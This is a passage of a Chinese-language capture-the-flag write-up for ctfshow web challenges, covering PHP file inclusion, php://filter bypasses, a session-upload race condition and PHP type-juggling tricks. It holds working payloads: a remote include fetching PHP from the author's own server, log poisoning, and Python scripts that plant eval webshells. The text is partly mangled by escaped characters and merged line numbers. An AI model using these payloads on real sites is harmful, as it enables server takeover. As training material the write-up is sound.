flag*\u0026#39;);?\u0026gt; ?file=data://text/plain,\u0026lt;?Php echo `tac f*`;?\u0026gt; or\n远程加载\n加载robots.txt，发现可以回显\n在自己vps上创建1.txt，内容如下 \u0026lt;?php system(\u0026quot;tac flag.php\u0026quot;);?\u0026gt;\n起一个http服务，加载 url/?file=http://x.x.x.x:7001/1.txt\nor\ninput协议 大小写绕过\npayload:\nPOST /?file=Php://input HTTP/1.1 \u0026lt;?Php system(\u0026#34;cat flag.php\u0026#34;);?\u0026gt; web80 1\u0026lt;?php 2 3 ?\u0026gt; 4Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 5Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3 6Accept-Encoding: gzip, deflate 7DNT: 1 8Cookie: UM_distinctid=17ffcdc88eb73a-022664ffe42c5b8-13676d4a-1fa400-17ffcdc88ec82c 9Connection: close 写入一句话木马\n连webshell工具或者直接get传参\n?file=/var/log/nginx/access.log\u0026amp;2=system(\u0026#39;ls /var/www/html\u0026#39;);phpinfo(); ?file=/var/log/nginx/access.log\u0026amp;2=system(\u0026#39;tac /var/www/html/fl0g.php\u0026#39;);phpinfo(); Or\ninput协议 大小写绕过\npayload:\nPOST /?file=Php://input HTTP/1.1 \u0026lt;?Php system(\u0026#34;cat flag.php\u0026#34;);?\u0026gt; web81 1\u0026lt;?php 2 3 ?\u0026gt;\u0026#39;);?\u0026gt;\u0026#34; 4 data = {\u0026#39;PHP_SESSION_UPLOAD_PROGRESS\u0026#39;: code} 5 cookies = {\u0026#39;PHPSESSID\u0026#39;: PHPSESSID} 6 files = {\u0026#39;file\u0026#39;: (\u0026#39;xxx.txt\u0026#39;, BytesIO(b\u0026#39;x\u0026#39; * 10240))} 7 while True: 8 post(URL, data, cookies=cookies, files=files) 9 10 11def read(): 12 params = {\u0026#39;file\u0026#39;: f\u0026#39;/tmp/sess_{PHPSESSID}\u0026#39;} 13 while True: 14 get(URL, params) 15 url = urljoin(URL, \u0026#39;shell.php\u0026#39;) 16 code = get(url).status_code.real 17 print(f\u0026#39;{url} {code}\u0026#39;) 18 if code == 200: 19 exit() 20 21 22if __name__ == \u0026#39;__main__\u0026#39;: 23 Thread(target=write, daemon=True).start() 24 read() poc2\n1import requests 2import io 3import threading 4 5url=\u0026#39;http://9a77fcb3-6f3c-4bd6-a247-07bfe6766509.challenge.ctf.show:8080/\u0026#39; 6sessionid=\u0026#39;ctfshow\u0026#39; 7data={ 8\t\u0026#34;1\u0026#34;:\u0026#34;file_put_contents(\u0026#39;/var/www/html/jiuzhen.php\u0026#39;,\u0026#39;\u0026lt;?php eval($_POST[3]);?\u0026gt;\u0026#39;);\u0026#34; 9} 10#这个是访问/tmp/sess_ctfshow时，post传递的内容，是在网站目录下写入一句话木马。这样一旦访问成功，就可以蚁剑连接了。 11def write(session):#/tmp/sess_ctfshow中写入一句话木马。 12\tfileBytes = io.BytesIO(b\u0026#39;a\u0026#39;*1024*50) 13\twhile True: 14\tresponse=session.post(url, 15\tdata={ 16\t\u0026#39;PHP_SESSION_UPLOAD_PROGRESS\u0026#39;:\u0026#39;\u0026lt;?php eval($_POST[1]);?\u0026gt;\u0026#39; 17\t}, 18\tcookies={ 19\t\u0026#39;PHPSESSID\u0026#39;:sessionid 20\t}, 21\tfiles={ 22\t\u0026#39;file\u0026#39;:(\u0026#39;ctfshow.jpg\u0026#39;,fileBytes) 23\t} 24\t) 25 26def read(session):#访问/tmp/sess_ctfshow，post传递信息，在网站目录下写入木马。 27\twhile True: 28\tresponse=session.post(url+\u0026#39;?file=/tmp/sess_\u0026#39;+sessionid,data=data, 29\tcookies={ 30\t\u0026#39;PHPSESSID\u0026#39;:sessionid 31\t} 32\t) 33\tresposne2=session.get(url+\u0026#39;jiuzhen.php\u0026#39;);#访问木马文件，如果访问到了就代表竞争成功 34\tif resposne2.status_code==200:了 35\tprint(\u0026#39;++++++done++++++\u0026#39;) 36\telse: 37\tprint(resposne2.status_code) 38 39if __name__ == \u0026#39;__main__\u0026#39;: 40 41\tevnet=threading.Event() 42\t#写入和访问分别设置5个线程。 43\twith requests.session() as session: 44\tfor i in range(5): 45\tthreading.Thread(target=write,args=(session,)).start() 46\tfor i in range(5): 47\tthreading.Thread(target=read,args=(session,)).start() 48 49\tevnet.set() getshell\n直接查flag\n利用条件\n存在文件包含漏洞 知道session文件存放路径，可以尝试默认路径 具有读取和写入session文件的权限 这两个脚本理论上适用于web82-web86\nweb83 web83的开篇设置了session_unset();session_destroy();\nsession_unset()：释放当前在内存中已经创建的所有$_SESSION变量，但不删除session文件以及不释放对应的。 session_destroy()：删除当前用户对应的session文件以及释放sessionid，内存中的$_SESSION变量内容依然保留。\n就是释放和清除了前面所有session变量和文件，但是我们的解题思路是竞争上传那一瞬间创建的session，所以不影响。\nweb84 加上了一个system(rm -rf /tmp/*);，但是因为本来session.upload_progress.cleanup = on，就会清空对应session文件中的内容，这里加上删除，对竞争的影响不大。（但是可能需要增加一些线程）\nweb85 添加了一个内容识别，如果有\u0026lt;就die，依旧可以竞争。\nweb86 dirname(FILE)表示当前文件的绝对路径。set_include_path函数,是用来设置include的路径的，就是include()可以不提供文件的完整路径了。 include文件时,当包含路径既不是相对路径，也不是绝对路径时(如:include(“test.php”))，会先查找include_path所设置的目录。 脚本里用的是完整路径，不影响竞争。\nweb82-86：参考https://blog.csdn.net/m0_48780534/article/details/125410757\nweb87 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-16 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-16 21:57:55 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12*/ 13 14if(isset($_GET[\u0026#39;file\u0026#39;])){ 15 $file = $_GET[\u0026#39;file\u0026#39;]; 16 $content = $_POST[\u0026#39;content\u0026#39;]; 17 $file = str_replace(\u0026#34;php\u0026#34;, \u0026#34;???\u0026#34;, $file); 18 $file = str_replace(\u0026#34;data\u0026#34;, \u0026#34;???\u0026#34;, $file); 19 $file = str_replace(\u0026#34;:\u0026#34;, \u0026#34;???\u0026#34;, $file); 20 $file = str_replace(\u0026#34;.\u0026#34;, \u0026#34;???\u0026#34;, $file); 21 file_put_contents(urldecode($file), \u0026#34;\u0026lt;?php die(\u0026#39;大佬别秀了\u0026#39;);?\u0026gt;\u0026#34;.$content); 22 23 24}else{ 25 highlight_file(__FILE__); 26} 使用 file_put_contents 函数将经过处理后的内容写入到文件中。写入的内容是先拼接了一个 \u0026lt;?php die('大佬别秀了');?\u0026gt; 字符串,用于在后续如果有人直接访问写入后的文件时，防止文件内容被直接执行而显示一些提示信息，然后再拼接上从 $_POST 中获取的 $content 变量的值。\n这道题需要用到php://filter\nphp://filter的使用 原文：谈一谈php://filter的妙用 | 离别歌\nphp://filter之前最常出镜的地方是XXE。由于XXE漏洞的特殊性，我们在读取HTML、PHP等文件时可能会抛出此类错误parser error : StartTag: invalid element name 。其原因是，PHP是基于标签的脚本语言，\u0026lt;?php ... ?\u0026gt;这个语法也与XML相符合，所以在解析XML的时候会被误认为是XML，而其中内容（比如特殊字符）又有可能和标准XML冲突，所以导致了出错。\n那么，为了读取包含有敏感信息的PHP等源文件，我们就要先将“可能引发冲突的PHP代码”编码一遍，这里就会用到php://filter。\nphp://filter是PHP语言中特有的协议流，作用是作为一个“中间流”来处理其他流。比如，我们可以用如下一行代码将POST内容转换成base64编码并输出：\nreadfile(\u0026#34;php://filter/read=convert.base64-encode/resource=php://input\u0026#34;); 如下：\n所以，在XXE中，我们也可以将PHP等容易引发冲突的文件流用php://filter协议流处理一遍，这样就能有效规避特殊字符造成混乱。\n如下，我们使用的是php://filter/read=convert.base64-encode/resource=./xxe.php\n回归正题\n我们审一下这道题目的代码\n相比上一道题这题增加了一个post参数，且会将传入的参数进行拼接后写入文件\n1 $content = $_POST[\u0026#39;content\u0026#39;]; 2 file_put_contents(urldecode($file), \u0026#34;\u0026lt;?php die(\u0026#39;大佬别秀了\u0026#39;);?\u0026gt;\u0026#34;.$content); 这道题在$content和$file之间拼接了一个\u003c?php die('大佬别秀了');?\u003e，导致即使我们成功写入一句话，也执行不了\n我们如何绕过这个die呢？\n其实我们可以通过php://filter流的base64-decode方法来去除这个die\n因为php在解码base64编码的时候会先将不属于base64中的字符去除，再进行转换，如下\n1\u0026lt;?php 2$_GET[\u0026#39;txt\u0026#39;] = preg_replace(\u0026#39;|[^a-z0-9A-Z+/]|s\u0026#39;, \u0026#39;\u0026#39;, $_GET[\u0026#39;txt\u0026#39;]); 3base64_decode($_GET[\u0026#39;txt\u0026#39;]); 所以，我们可以使用 php://filter/write=convert.base64-decode 来首先对其解码。在解码的过程中，字符\u0026lt;、?、;、\u0026gt;、、(、) 、\u0026lsquo;空格等字符不符合base64编码的字符范围将被忽略，所以最终被解码的字符仅有“phpdie”和我们传入的其他字符。\n”phpdie“一共6个字符，由于base64算法解码时是4个byte一组，所以给他增加2个“a”一共8个字符。这样，\u0026ldquo;phpdie\u0026quot;被正常解码，而后面我们传入的webshell的base64内容也被正常解码。\n同时由于会对传入的file进行url解码，所以需要对传入的file进行两次url编码\nwarning!!!url编码需要连同英文字符一起进行转换，可以借助hackbar强制进行转换（找了很久）\npoc:\n原文：file=php://filter/write=convert.base64-decode/resource=shell.php file=%25%37%30%25%36%38%25%37%30%25%33%61%25%32%66%25%32%66%25%36%36%25%36%39%25%36%63%25%37%34%25%36%35%25%37%32%25%32%66%25%37%37%25%37%32%25%36%39%25%37%34%25%36%35%25%33%64%25%36%33%25%36%66%25%36%65%25%37%36%25%36%35%25%37%32%25%37%34%25%32%65%25%36%32%25%36%31%25%37%33%25%36%35%25%33%36%25%33%34%25%32%64%25%36%34%25%36%35%25%36%33%25%36%66%25%36%34%25%36%35%25%32%66%25%37%32%25%36%35%25%37%33%25%36%66%25%37%35%25%37%32%25%36%33%25%36%35%25%33%64%25%37%33%25%36%38%25%36%35%25%36%63%25%36%63%25%32%65%25%37%30%25%36%38%25%37%30 原文：content=\u0026lt;?php system(\u0026#39;cat fl0g.php\u0026#39;);?\u0026gt; content=aaPD9waHAgc3lzdGVtKCdjYXQgZmwwZy5waHAnKTs/Pg== 访问shell.php,得到flag\n其实还可以通过其他编码来进行绕过如rot13\n更多file_put_content和死亡·杂糅代码之缘 - 先知社区\nweb88 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-16 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-17 02:27:25 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12 */ 13if(isset($_GET[\u0026#39;file\u0026#39;])){ 14 $file = $_GET[\u0026#39;file\u0026#39;]; 15 if(preg_match(\u0026#34;/php|\\~|\\!|\\@|\\#|\\\\$|\\%|\\^|\\\u0026amp;|\\*|\\(|\\)|\\-|\\_|\\+|\\=|\\./i\u0026#34;, $file)){ 16 die(\u0026#34;error\u0026#34;); 17 } 18 include($file); 19}else{ 20 highlight_file(__FILE__); 21} 这题过滤了很多字符但是没有过滤:、/、;\npoc\n?file=data://text/plain;base64,PD89c3lzdGVtKCJ0YWMgZmwwZy5waHAiKTsgPz4 web116 拿到题目环境，发现是个视频，下载视频用binwalk扫一下\n提取图片，发现是源码\n直接get传参读flag\n?file=flag.php web117 web87的后续 死亡绕过\n1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: yu22x 6# @Date: 2020-09-16 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-10-01 18:16:59 9 10*/ 11highlight_file(__FILE__); 12error_reporting(0); 13function filter($x){ 14 if(preg_match(\u0026#39;/http|https|utf|zlib|data|input|rot13|base64|string|log|sess/i\u0026#39;,$x)){ 15 die(\u0026#39;too young too simple sometimes naive!\u0026#39;); 16 } 17} 18$file=$_GET[\u0026#39;file\u0026#39;]; 19$contents=$_POST[\u0026#39;contents\u0026#39;]; 20filter($file); 21file_put_contents($file, \u0026#34;\u0026lt;?php die();?\u0026gt;\u0026#34;.$contents); 这题过滤了一些php的协议和转换器\n但是没过滤掉filter和convert\n我们可以考虑用filter搭配convert.iconv.*过滤器来构造出payload\n参考文章：详解php://filter以及死亡绕过_filter绕过过滤-CSDN博客\n1\u0026lt;?php 2 ?\u0026gt;\u0026#39;); 3echo $enc; 4?\u0026gt; 首先我们先将一句话木马从UCS-2BE转换成UCS-2LE\n?\u0026lt;hp pe@av(l_$EG[T]1;)\u0026gt;? 接着构造payload将一句话木马从UCS-2LE转换回UCS-2BE，同时破坏掉\u003c?php die();?\u003e\n效果如下\npayload:\nfile=php://filter/write=convert.iconv.UCS-2LE.UCS-2BE/resource=shell.php contents=?\u0026lt;hp pe@av(l_$EG[T]1;)\u0026gt;? 成功写入一句话木马，拿到flag\nphp特性 参考网站：\nphp一些特性函数（ctfshow）\nweb89 1\u0026lt;?php 2 3/* 4\\# -*- coding: utf-8 -*- 5\\# @Author: h1xa 6\\# @Date: 2020-09-16 11:25:09 7\\# @Last Modified by: h1xa 8\\# @Last Modified time: 2020-09-18 15:38:51 9\\# @email: h1xa@ctfer.com 10\\# @link: https://ctfer.com 11 12*/ 13 14 15include(\u0026#34;flag.php\u0026#34;); 16highlight_file(__FILE__); 17 18if(isset($_GET[\u0026#39;num\u0026#39;])){ 19 $num = $_GET[\u0026#39;num\u0026#39;]; 20 if(preg_match(\u0026#34;/[0-9]/\u0026#34;, $num)){ 21 die(\u0026#34;no no no!\u0026#34;); 22 } 23 if(intval($num)){ 24 echo $flag; 25 } 26} 这题要用到数组绕过的特性来绕过preg_match的匹配\npreg_match函数： preg_match函数是用于完成字符串的正则匹配的函数，如果找到一个匹配的，就返回1，否则就返回0。 preg_match只能处理字符串，如果传入的值是数组的话，就会报错，从而返回false，绕过了正则匹配。\nintval函数: 定义:intval()函数是 PHP 中的一个内置函数。它用于获取变量的整数值。其基本语法是intval($var, $base = 10)。其中$var是要转换的变量，$base是可选参数，用于指定进制（当$var`是字符串时），默认是十进制。\n特性：\n1.如果变量本身是整数，intval()函数会返回变量本身的值。\n2.当变量是字符串时，intval()会尝试将字符串转换为整数。它会从字符串的开头提取数字部分，直到遇到非数字字符为止。\n3.如果字符串以非数字字符开头，intval()会返回 0。\n4.当第二个参数$base被指定时，intval()可以将字符串按照指定的进制转换为十进制整数。\n注意事项\n1.对于浮点数，intval()会直接截断小数部分，而不是进行四舍五入。\n2.当处理超出整数范围的值时（在 PHP 中，根据平台和配置不同，整数范围有所不同），可能会出现意外的结果。例如，在 32 位系统上，int类型的最大值是2147483647，如果intval()处理的值超过这个范围，可能会导致数据丢失或者不正确的转换。\n这道题直接用数组绕过\npayload:\n?num[]=1 web90 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-16 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-18 16:06:11 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12*/ 13 14 15include(\u0026#34;flag.php\u0026#34;); 16highlight_file(__FILE__); 17if(isset($_GET[\u0026#39;num\u0026#39;])){ 18 $num = $_GET[\u0026#39;num\u0026#39;]; 19 if($num===\u0026#34;4476\u0026#34;){ 20 die(\u0026#34;no no no!\u0026#34;); 21 } 22 if(intval($num,0)===4476){ 23 echo $flag; 24 }else{ 25 echo intval($num,0); 26 } 27} 设置$base = 0能提供一种根据字符串内容自动判断进制来进行转换的灵活方式。\n这道题可以利用intval的特性和php强比较的特性\n当变量是字符串时，intval()会尝试将字符串转换为整数。它会从字符串的开头提取数字部分，直到遇到非数字字符为止。\nweb91 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: Firebasky 6# @Date: 2020-09-16 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-18 16:16:09 9# @link: https://ctfer.com 10 11*/ 12 13show_source(__FILE__); 14include(\u0026#39;flag.php\u0026#39;); 15$a=$_GET[\u0026#39;cmd\u0026#39;]; 16if(preg_match(\u0026#39;/^php$/im\u0026#39;, $a)){ 17 if(preg_match(\u0026#39;/^php$/i\u0026#39;, $a)){ 18 echo \u0026#39;hacker\u0026#39;; 19 } 20 else{ 21 echo $flag; 22 } 23} 24else{ 25 echo \u0026#39;nonononono\u0026#39;; 26} 这题考察的是一个正则表达式的理解和绕过\n这两个正则表达式都是用来匹配字符串php的\n/^php$/im 的含义 ^：表示字符串的开始。 php：表示匹配字符 php。 $：表示字符串的结束。 i：表示不区分大小写。 m：表示多行模式（multi-line）。 要得到flag，我们需要让第一个判断为true，第二个判断为false\n而第二个正则表达式与正则表达式一的区别在于他没有进行多行匹配\n那我们只需要通过换行符就可以实现绕过\npayload:\ncmd=%oaphp web92 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: Firebasky 6# @Date: 2020-09-16 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-18 16:29:30 9# @link: https://ctfer.com 10 11*/ 12 13include(\u0026#34;flag.php\u0026#34;); 14highlight_file(__FILE__); 15if(isset($_GET[\u0026#39;num\u0026#39;])){ 16 $num = $_GET[\u0026#39;num\u0026#39;]; 17 if($num==4476){ 18 die(\u0026#34;no no no!\u0026#34;); 19 } 20 if(intval($num,0)==4476){ 21 echo $flag; 22 }else{ 23 echo intval($num,0); 24 } 25} 这题与90题的区别就在于这里进行的是弱类型的比较\n在弱类型的比较里面我们不能通过增加字母的方式绕过，如下\n\u0026#34;123aa\u0026#34; == 123 \u0026#34;123aa\u0026#34; === 123aa 我们可以通过其它方法来绕过\n如通过intval函数的特性，我们可以通过输入转换成其他进制的4476来进行绕过（前面说过当base=0时会自动进行进制的转换）。\npayload：\nHEX: 0x117c //十进制前面补0x OCT: 010574 //八进制前面补0 或者\n官方题解\nintval()函数如果$base为0则$var中存在字母的话遇到字母就停止读取,但是e这个字母比较特殊，可以在PHP中不是科学计数法。所以为了绕过前面的==4476，我们就可以构造 4476e123\nweb93 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: Firebasky 6# @Date: 2020-09-16 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-18 16:32:58 9# @link: https://ctfer.com 10 11*/ 12 13include(\u0026#34;flag.php\u0026#34;); 14highlight_file(__FILE__); 15if(isset($_GET[\u0026#39;num\u0026#39;])){ 16 $num = $_GET[\u0026#39;num\u0026#39;]; 17 if($num==4476){ 18 die(\u0026#34;no no no!\u0026#34;); 19 } 20 if(preg_match(\u0026#34;/[a-z]/i\u0026#34;, $num)){ 21 die(\u0026#34;no no no!\u0026#34;); 22 } 23 if(intval($num,0)==4476){ 24 echo $flag; 25 }else{ 26 echo intval($num,0); 27 } 28} preg_match(\u0026#34;/[a-z]/i\u0026#34;, $num) 相比上一题这题增加了一个字母的匹配，让我们不能用上一题e绕过的方法和十六进制绕过的方法\n但是八进制绕过依旧是可行的，因为他不包含字母\npayload:\nnum=010574 web94 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-16 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-18 16:46:19 9# @link: https://ctfer.com 10 11*/ 12 13include(\u0026#34;flag.php\u0026#34;); 14highlight_file(__FILE__); 15if(isset($_GET[\u0026#39;num\u0026#39;])){ 16 $num = $_GET[\u0026#39;num\u0026#39;]; 17 if($num===\u0026#34;4476\u0026#34;){ 18 die(\u0026#34;no no no!\u0026#34;); 19 } 20 if(preg_match(\u0026#34;/[a-z]/i\u0026#34;, $num)){ 21 die(\u0026#34;no no no!\u0026#34;); 22 } 23 if(!strpos($num, \u0026#34;0\u0026#34;)){ 24 die(\u0026#34;no no no!\u0026#34;); 25 } 26 if(intval($num,0)===4476){ 27 echo $flag; 28 } 29} !strpos($num, \u0026#34;0\u0026#34;) 这题增加了一个条件，同时判断也变成了强判定，这里的strpos()函数用于查找字符串在另一个字符串中首次出现的位置。\n也就是这里我们需要让首位不等于0才能使这个判断为false\nstrops函数绕过： 对于strpos()函数，我们可以利用换行进行绕过（%0a） payload:?num=%0a010574 也可以小数点绕过 payload：?num=4476.0 因为intval()函数只读取整数部分 还可以八进制绕过(%20是空格的url编码形式) payload：?num=%20010574 ?num= 010574 // 前面加个空格 ?num=+010574 ?num=+4476.0\n我们选用其中一个绕过方法即可\n如空格绕过\n?num=%20010574 这题因为用的是强判定也可以用这种方法\n?num=4476.0 这种方法就是使其变为浮点型从而使强判定为false，绕过第一个判定\nweb95 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-16 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-18 16:53:59 9# @link: https://ctfer.com 10 11*/ 12 13include(\u0026#34;flag.php\u0026#34;); 14highlight_file(__FILE__); 15if(isset($_GET[\u0026#39;num\u0026#39;])){ 16 $num = $_GET[\u0026#39;num\u0026#39;]; 17 if($num==4476){ 18 die(\u0026#34;no no no!\u0026#34;); 19 } 20 if(preg_match(\u0026#34;/[a-z]|\\./i\u0026#34;, $num)){ 21 die(\u0026#34;no no no!!\u0026#34;); 22 } 23 if(!strpos($num, \u0026#34;0\u0026#34;)){ 24 die(\u0026#34;no no no!!!\u0026#34;); 25 } 26 if(intval($num,0)===4476){ 27 echo $flag; 28 } 29} 这题和上一题的区别就是改为了弱判定\n所以上一题的方法二就用不了了，我们用方法一即可\npayload:\n?num=%20010574 web96 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-16 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-18 19:21:24 9# @link: https://ctfer.com 10 11*/ 12 13 14highlight_file(__FILE__); 15 16if(isset($_GET[\u0026#39;u\u0026#39;])){ 17 if($_GET[\u0026#39;u\u0026#39;]==\u0026#39;flag.php\u0026#39;){ 18 die(\u0026#34;no no no\u0026#34;); 19 }else{ 20 highlight_file($_GET[\u0026#39;u\u0026#39;]); 21 } 22 23 24} 我们知道./指的的是当前目录，所以直接用./绕过即可，不影响文件读取\npayload:\n?u=./flag.php or\nu=/var/www/html/flag.php ?u=php://filter/read=convert.base64-encode/resource=flag.php web97 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-16 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-18 19:36:32 9# @link: https://ctfer.com 10 11*/ 12 13include(\u0026#34;flag.php\u0026#34;); 14highlight_file(__FILE__); 15if (isset($_POST[\u0026#39;a\u0026#39;]) and isset($_POST[\u0026#39;b\u0026#39;])) { 16if ($_POST[\u0026#39;a\u0026#39;] != $_POST[\u0026#39;b\u0026#39;]) 17if (md5($_POST[\u0026#39;a\u0026#39;]) === md5($_POST[\u0026#39;b\u0026#39;])) 18echo $flag; 19else 20print \u0026#39;Wrong.\u0026#39;; 21} 22?\u0026gt; 这是一道md5强比较的题目，绕过姿势挺多\n我们可以通过简单的数组绕过\na[]=1\u0026amp;b[]=2 虽然会报错但是能拿到flag\nweb98 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-16 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-18 21:39:27 9# @link: https://ctfer.com 10 11*/ 12 13include(\u0026#34;flag.php\u0026#34;); 14$_GET?$_GET=\u0026amp;$_POST:\u0026#39;flag\u0026#39;; 15$_GET[\u0026#39;flag\u0026#39;]==\u0026#39;flag\u0026#39;?$_GET=\u0026amp;$_COOKIE:\u0026#39;flag\u0026#39;; 16$_GET[\u0026#39;flag\u0026#39;]==\u0026#39;flag\u0026#39;?$_GET=\u0026amp;$_SERVER:\u0026#39;flag\u0026#39;; 17highlight_file($_GET[\u0026#39;HTTP_FLAG\u0026#39;]==\u0026#39;flag\u0026#39;?$flag:__FILE__); 18 19?\u0026gt; CTFSHOW web入门刷题 web98-112_ctfshow web98-CSDN博客\n这道题用到了三元运算符\n首先判断是否GET传入了数据，如果传入了则将POST的地址赋值给了GET\n其实就是用POST替换GET\n如果GET存在flag字段的值则会继续替换，最后替换成SERVER\n这里我们只要GET随便传入一个数据让post替换get\n然后post传入 HTTP_FLAG=flag\n这样最后highlight_file就能去显示$flag\n这道题一开始没看懂代码，看了上面大佬的解释感觉其实也不难\nweb99 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-16 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-18 22:36:12 9# @link: https://ctfer.com 10 11*/ 12 13highlight_file(__FILE__); 14$allow = array(); 15for ($i=36; $i \u0026lt; 0x36d; $i++) { 16 array_push($allow, rand(1,$i)); 17} 18if(isset($_GET[\u0026#39;n\u0026#39;]) \u0026amp;\u0026amp; in_array($_GET[\u0026#39;n\u0026#39;], $allow)){ 19 ($_GET[\u0026#39;n\u0026#39;], $_POST[\u0026#39;content\u0026#39;]); 20} 21 22?\u0026gt; 这道题首先是创建了一个数组，然后通过循环写入数字（范围0~0x36d）\n接着对传入的n进行判断，判断其是否在数组中，若存在则以n为名字创建一个文件并写入content的内容\n我们需要知道的是：\n在弱类型中当php字符串和int比较时,字符串会被转换成int，所以 字符串中数字后面的字符串会被忽略。题目中的in_array没有设置type,我们可以输入字符串5.php(此处数字随意，只要在rand(1,0x36d)之间即可),转换之后也就是5,明显是在题目中生成的数组中的\n所以我们通过传入content写马后，通过蚁剑连接或者直接命令执行即可得到flag\nweb100 1\u0026lt;?php 2 3/* 4\\# -*- coding: utf-8 -*- 5\\# @Author: h1xa 6\\# @Date: 2020-09-16 11:25:09 7\\# @Last Modified by: h1xa 8\\# @Last Modified time: 2020-09-21 22:10:28 9\\# @link: https://ctfer.com 10 11*/ 12 13highlight_file(__FILE__); 14include(\u0026#34;ctfshow.php\u0026#34;); 15//flag in class ctfshow; 16$ctfshow = new ctfshow(); 17$v1=$_GET[\u0026#39;v1\u0026#39;]; 18$v2=$_GET[\u0026#39;v2\u0026#39;]; 19$v3=$_GET[\u0026#39;v3\u0026#39;]; 20$v0=is_numeric($v1) and is_numeric($v2) and is_numeric($v3); 21if($v0){ 22 if(!preg_match(\u0026#34;/\\;/\u0026#34;, $v2)){ 23 if(preg_match(\u0026#34;/\\;/\u0026#34;, $v3)){ 24 eval(\u0026#34;$v2(\u0026#39;ctfshow\u0026#39;)$v3\u0026#34;); 25 } 26 } 27 28} 29 30 31 32?\u0026gt; 这题其实就是一道简单的拼接题\n$v0=is_numeric($v1) and is_numeric($v2) and is_numeric($v3); 这里看起来像是要求v1，v2，v3都为数字，实际上只需v1为数字则会将v1赋给v0，而不会再执行后面的语句\n所以我们这里只需要使v1为数字即可\npayload:\n?v1=21\u0026amp;v2=var_dump($ctfshow)/*\u0026amp;v3=*/; 或者用命令\n1?v1=1\u0026amp;v2=system(\u0026#39;ls\u0026#39;)/*\u0026amp;v3=*/; 将0x2d更换成-得到flag\nweb101 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-16 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-22 00:26:48 9# @link: https://ctfer.com 10 11*/ 12 13highlight_file(__FILE__); 14include(\u0026#34;ctfshow.php\u0026#34;); 15//flag in class ctfshow; 16$ctfshow = new ctfshow(); 17$v1=$_GET[\u0026#39;v1\u0026#39;]; 18$v2=$_GET[\u0026#39;v2\u0026#39;]; 19$v3=$_GET[\u0026#39;v3\u0026#39;]; 20$v0=is_numeric($v1) and is_numeric($v2) and is_numeric($v3); 21if($v0){ 22 if(!preg_match(\u0026#34;/\\\\\\\\|\\/|\\~|\\`|\\!|\\@|\\#|\\\\$|\\%|\\^|\\*|\\)|\\-|\\_|\\+|\\=|\\{|\\[|\\\u0026#34;|\\\u0026#39;|\\,|\\.|\\;|\\?|[0-9]/\u0026#34;, $v2)){ 23 if(!preg_match(\u0026#34;/\\\\\\\\|\\/|\\~|\\`|\\!|\\@|\\#|\\\\$|\\%|\\^|\\*|\\(|\\-|\\_|\\+|\\=|\\{|\\[|\\\u0026#34;|\\\u0026#39;|\\,|\\.|\\?|[0-9]/\u0026#34;, $v3)){ 24 eval(\u0026#34;$v2(\u0026#39;ctfshow\u0026#39;)$v3\u0026#34;); 25 } 26 } 27 28} 29 30?\u0026gt; 题目描述:修补100题非预期,替换0x2d\n修补了上一题通过直接命令执行或者var_dump打印类的方法\n我们可以尝试使用反射类的方法，利用题目给出的('ctfshow')来拼接打印类\npayload:\n?v1=1\u0026amp;v2=echo new Reflectionclass\u0026amp;v3=; 这道题的flag少了一位，在得到的flag在替换掉0x2d后，再进行爆破即可得到flag\npayload:\n1a = \u0026#34;fa2a169a0x2da0820x2d40f30x2da5cd0x2d65ce0d29b42\u0026#34; 2b = a.replace(\u0026#34;0x2d\u0026#34;,\u0026#34;-\u0026#34;) 3hex = [\u0026#34;1\u0026#34;,\u0026#34;2\u0026#34;,\u0026#34;3\u0026#34;,\u0026#34;4\u0026#34;,\u0026#34;5\u0026#34;,\u0026#34;6\u0026#34;,\u0026#34;7\u0026#34;,\u0026#34;8\u0026#34;,\u0026#34;9\u0026#34;,\u0026#34;a\u0026#34;,\u0026#34;b\u0026#34;,\u0026#34;c\u0026#34;,\u0026#34;d\u0026#34;,\u0026#34;e\u0026#34;] 4for i in hex: 5 print(\u0026#34;ctfshow{\u0026#34;+b+i+\u0026#34;}\u0026#34;) web102 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# 